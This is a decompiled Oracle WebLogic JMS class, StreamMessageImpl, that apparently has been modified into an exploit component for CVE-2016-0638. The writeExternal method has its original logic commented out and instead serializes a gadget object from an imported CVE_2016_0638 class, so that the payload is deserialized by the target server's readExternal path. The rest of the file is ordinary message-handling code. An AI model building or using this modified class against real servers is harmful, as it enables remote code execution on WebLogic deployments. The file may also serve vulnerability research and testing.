//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package weblogic.jms.common;

import java.io.*;
import java.lang.reflect.InvocationTargetException;
import javax.jms.Destination;
import javax.jms.JMSException;
import javax.jms.MessageEOFException;
import javax.jms.MessageNotWriteableException;
import javax.jms.StreamMessage;
import weblogic.jms.JMSClientExceptionLogger;
import com.weblogcVul.CVE_2016_0638;
public final class StreamMessageImpl extends MessageImpl implements StreamMessage, Externalizable {
    private static final byte EXTVERSION1 = 1;
    private static final byte EXTVERSION2 = 2;
    private static final byte EXTVERSION3 = 3;
    private static final byte VERSIONMASK = 127;
    static final long serialVersionUID = 7748687583664395357L;
    private static final byte UNKNOWN_TYPECODE = 0;
    private static final byte BOOLEAN_TYPE = 1;
    private static final byte BYTE_TYPE = 2;
    private static final byte CHAR_TYPE = 3;
    private static final byte DOUBLE_TYPE = 4;
    private static final byte FLOAT_TYPE = 5;
    private static final byte INT_TYPE = 6;
    private static final byte LONG_TYPE = 7;
    private static final byte SHORT_TYPE = 8;
    private static final byte STRING_UTF_TYPE = 9;
    private static final byte STRING_UTF32_TYPE = 10;
    private static final byte BYTES_TYPE = 11;
    private static final byte NULL_TYPE = 12;
    private static final String[] TYPE_CODE_STRINGS = new String[]{"invalid type code", "boolean", "byte", "char", "double", "float", "integer", "long", "short", "String", "String", "byte array", "null object"};
    private static final String ERROR_MSG_SEGMENT = ". Previous attempt to read bytes from the stream message is not complete. As per the JMS standard, if the readBytes method does not return the value -1, a subsequent readBytes call must be made in order to ensure that there are no more bytes left to be read in. For more information, see the JMS API doc for the method readBytes in interface StreamMessage";
    private boolean readingByteArray;
    private int available_bytes;
    private transient PayloadStream payload;
    private transient boolean copyOnWrite;
    private transient BufferOutputStream bos;
    private transient BufferInputStream bis;

    public StreamMessageImpl() {
    }

    public StreamMessageImpl(StreamMessage var1) throws IOException, JMSException {
        this(var1, (Destination)null, (Destination)null);
    }

    public StreamMessageImpl(StreamMessage var1, Destination var2, Destination var3) throws IOException, JMSException {
        super(var1, var2, var3);
        if (!(var1 instanceof StreamMessageImpl)) {
            var1.reset();
        }

        try {
            while(true) {
                this.writeObject(var1.readObject());
            }
        } catch (MessageEOFException var5) {
            this.reset();
            this.setPropertiesWritable(false);
        }
    }

    public byte getType() {
        return 5;
    }

    public void nullBody() {
        this.payload = null;
        this.copyOnWrite = false;
        this.bis = null;
        this.bos = null;
        this.readingByteArray = false;
        this.available_bytes = 0;
    }

    private void putTypeBack() throws IOException {
        if (!this.readingByteArray) {
            this.bis.unput();
        }

    }

    private String readPastEnd() {
        return JMSClientExceptionLogger.logReadPastEndLoggable().getMessage();
    }

    private String readPastEnd3(int var1) {
        return JMSClientExceptionLogger.logReadPastEnd3Loggable(var1).getMessage();
    }

    private String streamReadError() {
        return JMSClientExceptionLogger.logStreamReadErrorLoggable().getMessage();
    }

    private String streamReadError(int var1) {
        return JMSClientExceptionLogger.logReadErrorLoggable(var1).getMessage();
    }

    private String streamWriteError() {
        return JMSClientExceptionLogger.logStreamWriteErrorLoggable().getMessage();
    }

    private String streamWriteError(int var1) {
        return JMSClientExceptionLogger.logWriteErrorLoggable(var1).getMessage();
    }

    private String streamConversionError(String var1, String var2) {
        return JMSClientExceptionLogger.logConversionErrorLoggable(var1, var2).getMessage();
    }

    private byte readType() throws JMSException {
        this.decompressMessageBody();
        this.checkReadable();
        if (this.readingByteArray) {
            return 11;
        } else {
            try {
                return this.bis.readByte();
            } catch (EOFException var2) {
                throw new weblogic.jms.common.MessageEOFException(this.readPastEnd3(0), var2);
            } catch (IOException var3) {
                throw new weblogic.jms.common.JMSException(this.streamReadError(0), var3);
            }
        }
    }

    private void writeType(byte var1) throws JMSException {
        this.checkWritable();

        try {
            this.bos.writeByte(var1);
        } catch (IOException var3) {
            throw new weblogic.jms.common.JMSException(JMSClientExceptionLogger.logStreamWriteErrorLoggable().getMessage(), var3);
        }
    }

    public boolean readBoolean() throws JMSException {
        byte var1 = this.readType();

        try {
            switch(var1) {
                case 1:
                    return this.bis.readBoolean();
                case 9:
                case 10:
                    return Boolean.valueOf(this.readStringInternal(var1));
                default:
                    this.putTypeBack();
                    String var2 = "";
                    if (this.readingByteArray) {
                        var2 = ". Previous attempt to read bytes from the stream message is not complete. As per the JMS standard, if the readBytes method does not return the value -1, a subsequent readBytes call must be made in order to ensure that there are no more bytes left to be read in. For more information, see the JMS API doc for the method readBytes in interface StreamMessage";
                    }

                    throw new MessageFormatException(this.streamConversionError(this.typeCodeToString(var1), this.typeCodeToString(1)) + var2);
            }
        } catch (EOFException var3) {
            throw new weblogic.jms.common.MessageEOFException(this.readPastEnd3(10), var3);
        } catch (IOException var4) {
            throw new weblogic.jms.common.JMSException(this.streamReadError(10), var4);
        }
    }

    public byte readByte() throws JMSException {
        byte var1 = this.readType();

        try {
            switch(var1) {
                case 2:
                    return this.bis.readByte();
                case 9:
                case 10:
                    int var2 = this.bis.pos();

                    try {
                        return Byte.parseByte(this.readStringInternal(var1));
                    } catch (NumberFormatException var4) {
                        this.bis.gotoPos(var2);
                        this.bis.unput();
                        throw var4;
                    }
                default:
                    this.putTypeBack();
                    String var3 = "";
                    if (this.readingByteArray) {
                        var3 = ". Previous attempt to read bytes from the stream message is not complete. As per the JMS standard, if the readBytes method does not return the value -1, a subsequent readBytes call must be made in order to ensure that there are no more bytes left to be read in. For more information, see the JMS API doc for the method readBytes in interface StreamMessage";
                    }

                    throw new MessageFormatException(this.streamConversionError(this.typeCodeToString(var1), this.typeCodeToString(2)) + var3);
            }
        } catch (EOFException var5) {
            throw new weblogic.jms.common.MessageEOFException(this.readPastEnd3(20), var5);
        } catch (IOException var6) {
            throw new weblogic.jms.common.JMSException(this.streamReadError(20), var6);
        }
    }

    public short readShort() throws JMSException {
        byte var1 = this.readType();

        try {
            switch(var1) {
                case 2:
                    return (short)this.bis.readByte();
                case 3:
                case 4:
                case 5:
                case 6:
                case 7:
                default:
                    this.putTypeBack();
                    String var3 = "";
                    if (this.readingByteArray) {
                        var3 = ". Previous attempt to read bytes from the stream message is not complete. As per the JMS standard, if the readBytes method does not return the value -1, a subsequent readBytes call must be made in order to ensure that there are no more bytes left to be read in. For more information, see the JMS API doc for the method readBytes in interface StreamMessage";
                    }

                    throw new MessageFormatException(this.streamConversionError(this.typeCodeToString(var1), this.typeCodeToString(8)) + var3);
                case 8:
                    return this.bis.readShort();
                case 9:
                case 10:
                    int var2 = this.bis.pos();

                    try {
                        return Short.parseShort(this.readStringInternal(var1));
                    } catch (NumberFormatException var4) {
                        this.bis.gotoPos(var2);
                        this.bis.unput();
                        throw var4;
                    }
            }
        } catch (EOFException var5) {
            throw new weblogic.jms.common.MessageEOFException(this.readPastEnd3(40), var5);
        } catch (IOException var6) {
            throw new weblogic.jms.common.JMSException(this.streamReadError(40), var6);
        }
    }

    public char readChar() throws JMSException {
        byte var1 = this.readType();

        try {
            switch(var1) {
                case 3:
                    return this.bis.readChar();
                case 12:
                    this.putTypeBack();
                    throw new NullPointerException();
                default:
                    this.putTypeBack();
                    String var2 = "";
                    if (this.readingByteArray) {
                        var2 = ". Previous attempt to read bytes from the stream message is not complete. As per the JMS standard, if the readBytes method does not return the value -1, a subsequent readBytes call must be made in order to ensure that there are no more bytes left to be read in. For more information, see the JMS API doc for the method readBytes in interface StreamMessage";
                    }

                    throw new MessageFormatException(this.streamConversionError(this.typeCodeToString(var1), this.typeCodeToString(3)) + var2);
            }
        } catch (EOFException var3) {
            throw new weblogic.jms.common.MessageEOFException(this.readPastEnd3(60), var3);
        } catch (IOException var4) {
            throw new weblogic.jms.common.JMSException(this.streamReadError(60), var4);
        }
    }

    public int readInt() throws JMSException {
        byte var1 = this.readType();

        try {
            switch(var1) {
                case 2:
                    return this.bis.readByte();
                case 3:
                case 4:
                case 5:
                case 7:
                default:
                    this.putTypeBack();
                    String var3 = "";
                    if (this.readingByteArray) {
                        var3 = ". Previous attempt to read bytes from the stream message is not complete. As per the JMS standard, if the readBytes method does not return the value -1, a subsequent readBytes call must be made in order to ensure that there are no more bytes left to be read in. For more information, see the JMS API doc for the method readBytes in interface StreamMessage";
                    }

                    throw new MessageFormatException(this.streamConversionError(this.typeCodeToString(var1), this.typeCodeToString(6)) + var3);
                case 6:
                    return this.bis.readInt();
                case 8:
                    return this.bis.readShort();
                case 9:
                case 10:
                    int var2 = this.bis.pos();

                    try {
                        return Integer.parseInt(this.readStringInternal(var1));
                    } catch (NumberFormatException var4) {
                        this.bis.gotoPos(var2);
                        this.bis.unput();
                        throw var4;
                    }
            }
        } catch (EOFException var5) {
            throw new weblogic.jms.common.MessageEOFException(this.readPastEnd3(70), var5);
        } catch (IOException var6) {
            throw new weblogic.jms.common.JMSException(this.streamReadError(70), var6);
        }
    }

    public long readLong() throws JMSException {
        byte var1 = this.readType();

        try {
            switch(var1) {
                case 2:
                    return (long)this.bis.readByte();
                case 3:
                case 4:
                case 5:
                default:
                    this.putTypeBack();
                    String var3 = "";
                    if (this.readingByteArray) {
                        var3 = ". Previous attempt to read bytes from the stream message is not complete. As per the JMS standard, if the readBytes method does not return the value -1, a subsequent readBytes call must be made in order to ensure that there are no more bytes left to be read in. For more information, see the JMS API doc for the method readBytes in interface StreamMessage";
                    }

                    throw new MessageFormatException(this.streamConversionError(this.typeCodeToString(var1), this.typeCodeToString(7)) + var3);
                case 6:
                    return (long)this.bis.readInt();
                case 7:
                    return this.bis.readLong();
                case 8:
                    return (long)this.bis.readShort();
                case 9:
                case 10:
                    int var2 = this.bis.pos();

                    try {
                        return Long.parseLong(this.readStringInternal(var1));
                    } catch (NumberFormatException var4) {
                        this.bis.gotoPos(var2);
                        this.bis.unput();
                        throw var4;
                    }
            }
        } catch (EOFException var5) {
            throw new weblogic.jms.common.MessageEOFException(this.readPastEnd3(80), var5);
        } catch (IOException var6) {
            throw new weblogic.jms.common.JMSException(this.streamReadError(80), var6);
        }
    }

    public float readFloat() throws JMSException {
        byte var1 = this.readType();

        try {
            switch(var1) {
                case 5:
                    return this.bis.readFloat();
                case 9:
                case 10:
                    int var2 = this.bis.pos();

                    try {
                        return Float.parseFloat(this.readStringInternal(var1));
                    } catch (NumberFormatException var4) {
                        this.bis.gotoPos(var2);
                        this.bis.unput();
                        throw var4;
                    }
                default:
                    this.putTypeBack();
                    String var3 = "";
                    if (this.readingByteArray) {
                        var3 = ". Previous attempt to read bytes from the stream message is not complete. As per the JMS standard, if the readBytes method does not return the value -1, a subsequent readBytes call must be made in order to ensure that there are no more bytes left to be read in. For more information, see the JMS API doc for the method readBytes in interface StreamMessage";
                    }

                    throw new MessageFormatException(this.streamConversionError(this.typeCodeToString(var1), this.typeCodeToString(5)) + var3);
            }
        } catch (EOFException var5) {
            throw new weblogic.jms.common.MessageEOFException(this.readPastEnd3(90), var5);
        } catch (IOException var6) {
            throw new weblogic.jms.common.JMSException(this.streamReadError(90), var6);
        }
    }

    public double readDouble() throws JMSException {
        byte var1 = this.readType();

        try {
            switch(var1) {
                case 4:
                    return this.bis.readDouble();
                case 5:
                    return (double)this.bis.readFloat();
                case 6:
                case 7:
                case 8:
                default:
                    this.putTypeBack();
                    String var3 = "";
                    if (this.readingByteArray) {
                        var3 = ". Previous attempt to read bytes from the stream message is not complete. As per the JMS standard, if the readBytes method does not return the value -1, a subsequent readBytes call must be made in order to ensure that there are no more bytes left to be read in. For more information, see the JMS API doc for the method readBytes in interface StreamMessage";
                    }

                    throw new MessageFormatException(this.streamConversionError(this.typeCodeToString(var1), this.typeCodeToString(4)) + var3);
                case 9:
                case 10:
                    int var2 = this.bis.pos();

                    try {
                        return Double.parseDouble(this.readStringInternal(var1));
                    } catch (NumberFormatException var4) {
                        this.bis.gotoPos(var2);
                        this.bis.unput();
                        throw var4;
                    }
            }
        } catch (EOFException var5) {
            throw new weblogic.jms.common.MessageEOFException(this.readPastEnd3(100), var5);
        } catch (IOException var6) {
            throw new weblogic.jms.common.JMSException(this.streamReadError(100), var6);
        }
    }

    public String readString() throws JMSException {
        byte var1 = this.readType();

        try {
            switch(var1) {
                case 1:
                    return String.valueOf(this.bis.readBoolean());
                case 2:
                    return String.valueOf(this.bis.readByte());
                case 3:
                    return String.valueOf(this.bis.readChar());
                case 4:
                    return String.valueOf(this.bis.readDouble());
                case 5:
                    return String.valueOf(this.bis.readFloat());
                case 6:
                    return String.valueOf(this.bis.readInt());
                case 7:
                    return String.valueOf(this.bis.readLong());
                case 8:
                    return String.valueOf(this.bis.readShort());
                case 9:
                    return this.readStringInternal(var1);
                case 10:
                    return this.readStringInternal(var1);
                case 11:
                default:
                    this.putTypeBack();
                    String var2 = "";
                    if (this.readingByteArray) {
                        var2 = ". Previous attempt to read bytes from the stream message is not complete. As per the JMS standard, if the readBytes method does not return the value -1, a subsequent readBytes call must be made in order to ensure that there are no more bytes left to be read in. For more information, see the JMS API doc for the method readBytes in interface StreamMessage";
                    }

                    throw new MessageFormatException(this.streamConversionError(this.typeCodeToString(var1), this.typeCodeToString(9)) + var2);
                case 12:
                    return null;
            }
        } catch (EOFException var3) {
            throw new weblogic.jms.common.MessageEOFException(this.readPastEnd(), var3);
        } catch (IOException var4) {
            throw new weblogic.jms.common.JMSException(this.streamReadError(), var4);
        }
    }

    public int readBytes(byte[] var1) throws JMSException {
        boolean var3 = true;
        if (var1 == null) {
            throw new NullPointerException();
        } else {
            try {
                if (!this.readingByteArray) {
                    byte var2;
                    if ((var2 = this.readType()) != 11) {
                        if (var2 == 12) {
                            return -1;
                        }

                        this.bis.unput();
                        throw new MessageFormatException(this.streamConversionError(this.typeCodeToString(var2), this.typeCodeToString(11)));
                    }

                    this.available_bytes = this.bis.readInt();
                    if (this.available_bytes == 0) {
                        return 0;
                    }

                    this.readingByteArray = true;
                }

                if (this.available_bytes == 0) {
                    this.readingByteArray = false;
                    return -1;
                } else {
                    int var9;
                    if (var1.length > this.available_bytes) {
                        var9 = this.bis.read(var1, 0, this.available_bytes);
                        this.readingByteArray = false;
                    } else {
                        var9 = this.bis.read(var1, 0, var1.length);
                        this.available_bytes -= var1.length;
                    }

                    return var9;
                }
            } catch (EOFException var5) {
                throw new weblogic.jms.common.MessageEOFException(this.readPastEnd(), var5);
            } catch (IOException var6) {
                throw new weblogic.jms.common.JMSException(this.streamReadError(), var6);
            } catch (ArrayIndexOutOfBoundsException var7) {
                throw new weblogic.jms.common.JMSException(JMSClientExceptionLogger.logStreamReadErrorIndexLoggable().getMessage(), var7);
            } catch (ArrayStoreException var8) {
                throw new weblogic.jms.common.JMSException(JMSClientExceptionLogger.logStreamReadErrorStoreLoggable().getMessage(), var8);
            }
        }
    }

    public Object readObject() throws JMSException {
        byte var1 = this.readType();

        try {
            switch(var1) {
                case 1:
                    return new Boolean(this.bis.readBoolean());
                case 2:
                    return new Byte(this.bis.readByte());
                case 3:
                    return new Character(this.bis.readChar());
                case 4:
                    return new Double(this.bis.readDouble());
                case 5:
                    return new Float(this.bis.readFloat());
                case 6:
                    return new Integer(this.bis.readInt());
                case 7:
                    return new Long(this.bis.readLong());
                case 8:
                    return new Short(this.bis.readShort());
                case 9:
                    return this.readStringInternal(var1);
                case 10:
                    return this.readStringInternal(var1);
                case 11:
                    if (this.readingByteArray) {
                        throw new MessageFormatException("Can not read next data. Previous attempt to read bytes from the stream message is not complete. As per the JMS standard, if the readBytes method does not return the value -1, a subsequent readBytes call must be made in order to ensure that there are no more bytes left to be read in. For more information, see the JMS API doc for the method readBytes in interface StreamMessage");
                    } else {
                        int var2 = this.bis.readInt();
                        byte[] var3 = new byte[var2];
                        int var4 = this.bis.read(var3, 0, var2);
                        if (var4 != var2) {
                            throw new EOFException("");
                        }

                        return var3;
                    }
                case 12:
                    return null;
                default:
                    this.bis.unput();
                    throw new MessageFormatException(this.streamConversionError(this.typeCodeToString(var1), "Object"));
            }
        } catch (EOFException var5) {
            throw new weblogic.jms.common.MessageEOFException(this.readPastEnd(), var5);
        } catch (IOException var6) {
            throw new weblogic.jms.common.JMSException(this.streamReadError(), var6);
        }
    }

    public void writeBoolean(boolean var1) throws JMSException {
        this.writeType((byte)1);

        try {
            this.bos.writeBoolean(var1);
        } catch (IOException var3) {
            throw new weblogic.jms.common.JMSException(this.streamWriteError(10), var3);
        }
    }

    public void writeByte(byte var1) throws JMSException {
        this.writeType((byte)2);

        try {
            this.bos.writeByte(var1);
        } catch (IOException var3) {
            throw new weblogic.jms.common.JMSException(this.streamWriteError(20), var3);
        }
    }

    public void writeShort(short var1) throws JMSException {
        this.writeType((byte)8);

        try {
            this.bos.writeShort(var1);
        } catch (IOException var3) {
            throw new weblogic.jms.common.JMSException(this.streamWriteError(30), var3);
        }
    }

    public void writeChar(char var1) throws JMSException {
        this.writeType((byte)3);

        try {
            this.bos.writeChar(var1);
        } catch (IOException var3) {
            throw new weblogic.jms.common.JMSException(this.streamWriteError(40), var3);
        }
    }

    public void writeInt(int var1) throws JMSException {
        this.writeType((byte)6);

        try {
            this.bos.writeInt(var1);
        } catch (IOException var3) {
            throw new weblogic.jms.common.JMSException(this.streamWriteError(50), var3);
        }
    }

    public void writeLong(long var1) throws JMSException {
        this.writeType((byte)7);

        try {
            this.bos.writeLong(var1);
        } catch (IOException var4) {
            throw new weblogic.jms.common.JMSException(this.streamWriteError(60), var4);
        }
    }

    public void writeFloat(float var1) throws JMSException {
        this.writeType((byte)5);

        try {
            this.bos.writeFloat(var1);
        } catch (IOException var3) {
            throw new weblogic.jms.common.JMSException(this.streamWriteError(70), var3);
        }
    }

    public void writeDouble(double var1) throws JMSException {
        this.writeType((byte)4);

        try {
            this.bos.writeDouble(var1);
        } catch (IOException var4) {
            throw new weblogic.jms.common.JMSException(this.streamWriteError(80), var4);
        }
    }

    public void writeString(String var1) throws JMSException {
        if (var1 == null) {
            this.writeType((byte)12);
        } else {
            try {
                this.writeStringInternal(var1);
            } catch (IOException var3) {
                throw new weblogic.jms.common.JMSException(this.streamWriteError(), var3);
            }
        }

    }

    public void writeBytes(byte[] var1) throws JMSException {
        this.writeBytes(var1, 0, var1.length);
    }

    public void writeBytes(byte[] var1, int var2, int var3) throws JMSException {
        if (var1 == null) {
            throw new NullPointerException();
        } else {
            this.writeType((byte)11);

            try {
                this.bos.writeInt(var3);
                this.bos.write(var1, var2, var3);
            } catch (IOException var5) {
                throw new weblogic.jms.common.JMSException(this.streamWriteError(100), var5);
            }
        }
    }

    public void writeObject(Object var1) throws JMSException {
        if (var1 instanceof Boolean) {
            this.writeBoolean((Boolean)var1);
        } else if (var1 instanceof Number) {
            if (var1 instanceof Byte) {
                this.writeByte((Byte)var1);
            } else if (var1 instanceof Double) {
                this.writeDouble((Double)var1);
            } else if (var1 instanceof Float) {
                this.writeFloat((Float)var1);
            } else if (var1 instanceof Integer) {
                this.writeInt((Integer)var1);
            } else if (var1 instanceof Long) {
                this.writeLong((Long)var1);
            } else if (var1 instanceof Short) {
                this.writeShort((Short)var1);
            }
        } else if (var1 instanceof Character) {
            this.writeChar((Character)var1);
        } else if (var1 instanceof String) {
            this.writeString((String)var1);
        } else if (var1 instanceof byte[]) {
            this.writeBytes((byte[])((byte[])var1));
        } else {
            if (var1 != null) {
                throw new MessageFormatException("Invalid Type: " + var1.getClass().getName());
            }

            this.writeType((byte)12);
        }

    }

    public void reset() throws JMSException {
        this.setBodyWritable(false);
        if (this.bis != null) {
            try {
                this.bis.reset();
            } catch (IOException var2) {
                throw new weblogic.jms.common.JMSException(this.streamReadError(217), var2);
            }
        } else if (this.bos != null) {
            this.payload = (PayloadStream)this.bos.moveToPayload();
            this.bos = null;
        }

        this.copyOnWrite = false;
    }

    public MessageImpl copy() throws JMSException {
        StreamMessageImpl var1 = new StreamMessageImpl();
        super.copy(var1);
        if (this.bos != null) {
            var1.payload = this.bos.copyPayloadWithoutSharedStream();
        } else if (this.payload != null) {
            var1.payload = this.payload.copyPayloadWithoutSharedStream();
        }

        var1.copyOnWrite = this.copyOnWrite = true;
        var1.setBodyWritable(false);
        var1.setPropertiesWritable(false);
        return var1;
    }

    private void checkWritable() throws JMSException {
        super.writeMode();
        if (this.bos == null) {
            this.bos = PayloadFactoryImpl.createOutputStream();
        } else if (this.copyOnWrite) {
            this.bos.copyBuffer();
            this.copyOnWrite = false;
        }

    }

    private void checkReadable() throws JMSException {
        super.readMode();
        if (this.payload == null) {
            throw new weblogic.jms.common.MessageEOFException(this.readPastEnd3(500));
        } else {
            if (this.bis == null) {
                try {
                    this.bis = this.payload.getInputStream();
                } catch (IOException var2) {
                    throw new weblogic.jms.common.JMSException(this.streamReadError(510), var2);
                }
            }

        }
    }

    public String toString() {
        return "StreamMessage[" + this.getJMSMessageID() + "]";
    }

    public void writeExternal(ObjectOutput var1) throws IOException {
        super.writeExternal(var1);
        ByteArrayOutputStream var2 = new ByteArrayOutputStream();
        ObjectOutputStream var3 = new ObjectOutputStream(var2);

        try {
            var3.writeObject(CVE_2016_0638.getObject());
            var3.flush();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        byte[] var5 = var2.toByteArray();
        var1.writeByte(1);
        var1.writeInt(var5.length);
        var1.write(var5);

//        int var3 = 2147483647;
//        ObjectOutput var2;
//        if (var1 instanceof JMSObjectOutputWrapper) {
//            var3 = ((JMSObjectOutputWrapper)var1).getCompressionThreshold();
//            var2 = ((JMSObjectOutputWrapper)var1).getInnerObjectOutput();
//        } else {
//            var2 = var1;
//        }
//
//        byte var4;
//        if (this.getVersion(var2) >= 30) {
//            var4 = (byte)(3 | (this.shouldCompress(var2, var3) ? -128 : 0));
//        } else {
//            var4 = 2;
//        }
//
//        var2.writeByte(var4);
//        if (this.isCompressed()) {
//            if (var4 == 2) {
//                this.decompress().writeLengthAndData(var2);
//            } else {
//                this.flushCompressedMessageBody(var2);
//            }
//
//        } else {
//            Object var5;
//            if (this.bos != null) {
//                var5 = this.bos;
//            } else {
//                if (this.payload == null) {
//                    var2.writeInt(0);
//                    return;
//                }
//
//                var5 = this.payload;
//            }
//
//            if ((var4 & -128) != 0) {
//                this.writeExternalCompressPayload(var2, (Payload)var5);
//            } else {
//                ((Payload)var5).writeLengthAndData(var2);
//            }
//
//        }
    }

    public final void decompressMessageBody() throws JMSException {
        if (this.isCompressed()) {
            try {
                this.payload = (PayloadStream)this.decompress();
            } catch (IOException var6) {
                throw new weblogic.jms.common.JMSException(JMSClientExceptionLogger.logErrorDecompressMessageBodyLoggable().getMessage(), var6);
            } finally {
                this.cleanupCompressedMessageBody();
            }

        }
    }

    public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException {
        super.readExternal(var1);
        byte var2 = var1.readByte();
        byte var3 = (byte)(var2 & 127);
        if (var3 >= 1 && var3 <= 3) {
            switch(var3) {
                case 1:
                    this.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);
                    BufferInputStream var4 = this.payload.getInputStream();
                    ObjectInputStream var5 = new ObjectInputStream(var4);
                    this.setBodyWritable(true);
                    this.setPropertiesWritable(true);

                    try {
                        while(true) {
                            this.writeObject(var5.readObject());
                        }
                    } catch (EOFException var9) {
                        try {
                            this.reset();
                            this.setPropertiesWritable(false);
                            PayloadStream var7 = this.payload.copyPayloadWithoutSharedStream();
                            this.payload = var7;
                        } catch (JMSException var8) {
                            JMSClientExceptionLogger.logStackTrace(var8);
                        }
                    } catch (MessageNotWriteableException var10) {
                        JMSClientExceptionLogger.logStackTrace(var10);
                    } catch (javax.jms.MessageFormatException var11) {
                        JMSClientExceptionLogger.logStackTrace(var11);
                    } catch (JMSException var12) {
                        JMSClientExceptionLogger.logStackTrace(var12);
                    }
                    break;
                case 3:
                    if ((var2 & -128) != 0) {
                        this.readExternalCompressedMessageBody(var1);
                        break;
                    }
                case 2:
                    this.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1);
            }

        } else {
            throw JMSUtilities.versionIOException(var3, 1, 3);
        }
    }

    public long getPayloadSize() {
        if (this.isCompressed()) {
            return (long)this.getCompressedMessageBodySize();
        } else if (super.bodySize != -1L) {
            return super.bodySize;
        } else if (this.payload != null) {
            return super.bodySize = (long)this.payload.getLength();
        } else {
            return this.bos != null ? (long)this.bos.size() : (super.bodySize = 0L);
        }
    }

    private String typeCodeToString(int var1) {
        try {
            return TYPE_CODE_STRINGS[var1];
        } catch (Throwable var3) {
            return TYPE_CODE_STRINGS[0];
        }
    }

    private void writeStringInternal(String var1) throws IOException, JMSException {
        if (var1.length() > 20000) {
            this.writeType((byte)10);
            this.bos.writeUTF32(var1);
        } else {
            this.writeType((byte)9);
            this.bos.writeUTF(var1);
        }

    }

    private String readStringInternal(byte var1) throws IOException {
        return var1 == 10 ? this.bis.readUTF32() : this.bis.readUTF();
    }

    private long getLen() {
        if (this.bos != null) {
            return (long)this.bos.size();
        } else {
            return this.payload != null ? (long)this.payload.getLength() : 0L;
        }
    }

    public long getBodyLength() throws JMSException {
        super.readMode();
        return this.getLen();
    }

    public byte[] getBodyBytes() throws JMSException {
        Object var1;
        if (this.payload != null) {
            var1 = this.payload;
        } else {
            if (this.bos == null) {
                return new byte[0];
            }

            var1 = this.bos;
        }

        try {
            ByteArrayOutputStream var2 = new ByteArrayOutputStream();
            ((Payload)var1).writeTo(var2);
            var2.flush();
            return var2.toByteArray();
        } catch (IOException var3) {
            throw new weblogic.jms.common.JMSException(var3);
        }
    }

    public PayloadStream getPayload() throws JMSException {
        if (this.isCompressed()) {
            try {
                this.payload = (PayloadStream)this.decompress();
            } catch (IOException var2) {
                throw new weblogic.jms.common.JMSException(JMSClientExceptionLogger.logErrorDecompressMessageBodyLoggable().getMessage(), var2);
            }
        }

        return this.payload;
    }

    public void setPayload(PayloadStream var1) {
        if (this.payload == null && this.bis == null && this.bos == null && !this.copyOnWrite) {
            try {
                this.writeMode();
            } catch (JMSException var3) {
                throw new AssertionError(var3);
            }

            this.payload = var1;
        } else {
            throw new AssertionError();
        }
    }
}
